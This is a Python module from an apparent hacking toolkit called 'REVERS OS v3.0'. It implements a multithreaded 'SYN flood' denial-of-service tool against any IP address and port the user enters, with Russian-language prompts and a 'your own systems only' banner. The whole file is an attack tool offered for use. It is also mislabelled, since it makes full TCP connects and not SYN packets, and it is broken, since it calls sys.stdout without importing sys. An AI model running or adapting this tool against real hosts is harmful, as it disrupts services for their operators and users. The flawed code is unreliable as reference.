#!/usr/bin/env python3
"""
REVERS OS v3.0 — SYN Flood
⚠️ Только для тестирования своих систем!
"""

import socket
import threading
import time
import random
from core.utils import C_ERROR, C_SUCCESS, C_WARNING, C_INFO, C_DIM, C_BRIGHT, C_RESET

running = False

def syn_worker(target, port, duration):
    global running
    end_time = time.time() + duration
    sent = 0
    
    while running and time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect_ex((target, port))
            sock.close()
            sent += 1
        except:
            pass
    
    return sent

def run_syn_flood(args):
    global running
    
    print(f"\n{C_ERROR}╔══════════════════════════════════════════╗{C_RESET}")
    print(f"{C_ERROR}║  ⚠️  ВНИМАНИЕ! ТОЛЬКО ДЛЯ СВОИХ СИСТЕМ!  ║{C_RESET}")
    print(f"{C_ERROR}║  Незаконное использование запрещено!    ║{C_RESET}")
    print(f"{C_ERROR}╚══════════════════════════════════════════╝{C_RESET}\n")
    
    if not args:
        target = input(f"{C_INFO}Цель (IP): {C_RESET}").strip()
        if not target:
            print(f"{C_ERROR}[!] Цель не указана.{C_RESET}")
            return
        try:
            port = int(input(f"{C_INFO}Порт (по умолч. 80): {C_RESET}").strip() or "80")
        except:
            port = 80
        try:
            threads = int(input(f"{C_INFO}Потоков (по умолч. 10): {C_RESET}").strip() or "10")
        except:
            threads = 10
        try:
            duration = int(input(f"{C_INFO}Длительность в секундах (по умолч. 10): {C_RESET}").strip() or "10")
        except:
            duration = 10
    else:
        target = args[0]
        try:
            port = int(args[1]) if len(args) > 1 else 80
            threads = int(args[2]) if len(args) > 2 else 10
            duration = int(args[3]) if len(args) > 3 else 10
        except:
            port, threads, duration = 80, 10, 10
    
    print(f"\n{C_WARNING}  ══════════════════════════════════════════{C_RESET}")
    print(f"{C_WARNING}         ⚡ SYN FLOOD{C_RESET}")
    print(f"{C_WARNING}         Цель: {target}:{port}{C_RESET}")
    print(f"{C_WARNING}         Потоков: {threads}{C_RESET}")
    print(f"{C_WARNING}         Длительность: {duration} сек{C_RESET}")
    print(f"{C_WARNING}  ══════════════════════════════════════════{C_RESET}\n")
    
    running = True
    workers = []
    
    print(f"{C_INFO}[*] Запуск...{C_RESET}")
    start_time = time.time()
    
    for _ in range(threads):
        t = threading.Thread(target=syn_worker, args=(target, port, duration))
        t.daemon = True
        t.start()
        workers.append(t)
    
    try:
        while time.time() - start_time < duration and running:
            time.sleep(0.5)
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            bar = "█" * (elapsed * 20 // duration) + "░" * (20 - elapsed * 20 // duration)
            sys.stdout.write(f"\r  [{bar}] {elapsed}s / {duration}s")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print(f"\n{C_WARNING}[!] Прервано.{C_RESET}")
    
    running = False
    for t in workers:
        t.join(timeout=1)
    
    print(f"\n{C_INFO}[*] SYN Flood завершён.{C_RESET}\n")
